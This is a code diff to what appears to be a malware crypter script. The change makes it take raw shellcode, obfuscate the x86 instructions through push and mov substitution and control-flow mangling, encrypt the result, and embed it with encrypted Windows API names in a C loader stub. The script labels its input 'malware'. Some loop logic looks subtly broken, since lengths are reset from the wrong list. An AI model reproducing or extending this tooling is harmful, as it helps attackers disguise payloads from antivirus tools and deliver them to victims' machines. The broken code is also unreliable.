@@ -35,6 +35,14 @@ import src.lib.obfuscation.control.opaquefunctioncall as opaquefunctioncall
 import src.lib.obfuscation.visitors.opaquevariablevisitor as opaquevariablevisitor
 import src.lib.obfuscation.visitors.opaquefunctioncallvisitor as opaquefunctioncallvisitor
 
+import src.lib.isahandling.isa as isa
+import src.lib.isahandling.sequencing as sequencing
+import src.lib.isahandling.isabyteshandler as isabyteshandler
+import src.lib.obfuscation.assembly.movobfuscation as movobfuscation
+import src.lib.obfuscation.assembly.pushobfuscation as pushobfuscation
+import src.lib.obfuscation.assembly.movdispobfuscation as movdispobfuscation
+import src.lib.obfuscation.assembly.flowmanglingobfuscation as flowmanglingobfuscation
+
 LIBRARIES = '/usr/i686-w64-mingw32/lib/'
 ORIGINAL_HEADERS_FOLDER = '/usr/i686-w64-mingw32/include/'
 TMP_INPUT_FILE = './src/crypters/idata_obfuscation/merged.c'
@@ -43,14 +51,14 @@ EXCLUDED_LIBRARIES = set(['d3dx9_38', 'glaux', 'qutil', 'xinput1_3', 'd3drm', 'p
 
 if __name__ == '__main__':
     if len(sys.argv) < 6:
-        print(f"Usage: {sys.argv[0]} <input.c> <output.c> <output_executable.exe> <input_pe_executable.exe> <json_headers_dataset.json> [seed]")
+        print(f"Usage: {sys.argv[0]} <input.c> <output.c> <output_executable.exe> <json_headers_dataset.json> <shellcode_path.bin> [seed]")
         sys.exit(1)
 
     input_file  = sys.argv[1]
     output_file = sys.argv[2]
     output_executable_path = sys.argv[3]
-    input_pe_executable = sys.argv[4]
-    json_headers_dataset = sys.argv[5]
+    json_headers_dataset = sys.argv[4]
+    shellcode_path = sys.argv[5]
     seed = None
     if len(sys.argv) == 7:
         print('Using selected seed...')
@@ -62,7 +70,6 @@ if __name__ == '__main__':
         prng.commit_changes()
     else:
         print("No seed was given, using a random seed...")
-
     
     print('Attempting conversion...')
     while True:
@@ -232,41 +239,108 @@ if __name__ == '__main__':
             
             print('Reading malware...')
 
-            with open(input_pe_executable, "rb") as f:
-                input_PE_data = f.read()
+            with open(shellcode_path, "rb") as f:
+                input_shellcode = f.read()
+           
+            print('Obfuscating shellcode...')
+
+            isa_x86_handler = isabyteshandler.X86ISAConversionHandler()
+            shellcode_instructions = isa_x86_handler.convert_to_instructions(input_shellcode)
+
+            mov_obfuscator = movobfuscation.StandardX86PUSHObfuscator()
+            push_obfuscator = pushobfuscation.StandardX86PUSHObfuscator()
+            mov_disp_obfuscator = movdispobfuscation.StandardX86MOVDISPObfuscator()
+            flow_mangling_obfuscation = flowmanglingobfuscation.StandardX86FlowManglingObfuscator()
+            final_sequencer = sequencing.X86SequencingHandler()
+
+            print('Replacing pushes')
+            shellcode_index = 0
+            shellcode_length = len(shellcode_instructions)
+            while shellcode_index < shellcode_length:
+                next_instruction = shellcode_instructions[shellcode_index]
+                if next_instruction.identified_function in [isa.X86Instructions.PUSHIMM8, isa.X86Instructions.PUSHIMM32]:
+                    new_instruction_list = push_obfuscator.obfuscate(next_instruction)
+
+                    del shellcode_instructions[shellcode_index]
+
+                    for item in reversed(new_instruction_list):
+                        shellcode_instructions.insert(shellcode_index, item)
+
+                    shellcode_index += len(new_instruction_list)
+                else:
+                    shellcode_index += 1
+                shellcode_length = len(new_instruction_list)
+
+            print('Obscuring movs...')
+            total_num_iterations = 2 ** 10
+            print(f'Iterating {total_num_iterations}')
+            for i in range(total_num_iterations):
+                shellcode_index = 0
+                shellcode_length = len(shellcode_instructions)
+                while shellcode_index < shellcode_length:
+                    next_instruction = shellcode_instructions[shellcode_index]
+
+                    taken_chance = prng.chance(0.4)
+                    
+                    if taken_chance and next_instruction.identified_function in [isa.X86Instructions.MOVR8DISP8MEM,isa.X86Instructions.MOVR8DISP32MEM, isa.X86Instructions.MOVR16DISP8MEM, isa.X86Instructions.MOVR16DISP32MEM, isa.X86Instructions.MOVR32DISP8MEM, isa.X86Instructions.MOVR32DISP32MEM, isa.X86Instructions.MOVR8BIS, isa.X86Instructions.MOVR16BIS, isa.X86Instructions.MOVR32BIS, isa.X86Instructions.MOVR8IS, isa.X86Instructions.MOVR16IS, isa.X86Instructions.MOVR32IS, isa.X86Instructions.MOVR8BISDISP8, isa.X86Instructions.MOVR8BISDISP32, isa.X86Instructions.MOVR16BISDISP8, isa.X86Instructions.MOVR16BISDISP32, isa.X86Instructions.MOVR32BISDISP8, isa.X86Instructions.MOVR32BISDISP32]:
+                        new_instruction_list = mov_obfuscator.obfuscate(next_instruction)
+
+                        del shellcode_instructions[shellcode_index]
+
+                        for item in reversed(new_instruction_list):
+                            shellcode_instructions.insert(shellcode_index, item)
+
+                        shellcode_index += len(new_instruction_list)
+                    elif taken_chance and next_instruction.identified_function in [isa.X86Instructions.MOVR8IMM8, isa.X86Instructions.MOVR16IMM16, isa.X86Instructions.MOVR32IMM32]:
+                        new_instruction_list = mov_disp_obfuscator.obfuscate(next_instruction)
+
+                        del shellcode_instructions[shellcode_index]
+
+                        for item in reversed(new_instruction_list):
+                            shellcode_instructions.insert(shellcode_index, item)
+
+                        shellcode_index += len(new_instruction_list)
+                    else:
+                        shellcode_index += 1
+
+                    shellcode_length = len(new_instruction_list)
+
+                if prng.chance(0.3):
+                    for i in range(8):
+                        flow_mangling_obfuscation.obfuscate(shellcode_instructions)
             
+            print('Fixing jumps in the shellcode...')
+
+            final_sequencer.fix_jumps(shellcode_instructions)
+            
+            print('Converting shellcode back to bytes...')
+            
+            transformed_shellcode_instructions = isa_x86_handler.convert_to_bytes(shellcode_instructions)
+
             print('Creating encryption objects...')
 
             encryption_algorithm = encryption.SimpleMatrixEncryptionAlgorithm()
 
             print('Encrypting malware...')
 
-            encrypted_data = encryption_algorithm.encrypt(input_PE_data)
+            encrypted_data = encryption_algorithm.encrypt(transformed_shellcode_instructions)
             size_encrypted_malware = len(encrypted_data)
             encrypted_bytes_string = "".join(f"\\x{b:02x}" for b in encrypted_data)
             
             print('Writing encrypted malware to file...')
             
             final_content = re.sub(
-                r'(char executable_pe\[\]\s*=\s*")[^"]*(")',
+                r'(char shellcode_to_execute\[\]\s*=\s*")[^"]*(")',
                 lambda m: m.group(1) + encrypted_bytes_string + m.group(2),
                 final_content
             )
 
-            print('Writing length of encrypted malware to file...')
-
-            final_content = re.sub(
-                r'(DWORD executable_size\s*=\s*)\d+(\s*;)',
-                lambda m: m.group(1) + str(size_encrypted_malware) + m.group(2),
-                final_content
-            )
-           
             print('Placing kernel and function strings...')
             
             kernel_string = 'KERNEL32.DLL'.encode('utf-16-le') + b'\x00\x00'
             encrypted_kernel_string = encryption_algorithm.encrypt(kernel_string)
             
-            kernel_library_function_string = 'GetProcAddress\x00LoadLibraryA\x00GetModuleHandleA\x00VirtualAlloc\x00VirtualProtect\x00HeapFree\x00HeapAlloc\x00GetProcessHeap\x00WriteFile\x00GetStdHandle\x00VirtualFree'.encode('ascii') + b'\x00'
+            kernel_library_function_string = 'GetProcAddress\x00LoadLibraryA\x00GetModuleHandleA\x00VirtualAlloc\x00VirtualProtect\x00HeapFree\x00HeapAlloc\x00GetProcessHeap\x00WriteFile\x00GetStdHandle\x00VirtualFree\x00CreateFileA\x00CloseHandle'.encode('ascii') + b'\x00'
             encrypted_kernel_library_function_string = encryption_algorithm.encrypt(kernel_library_function_string)
             
             # Replace kernel library name size
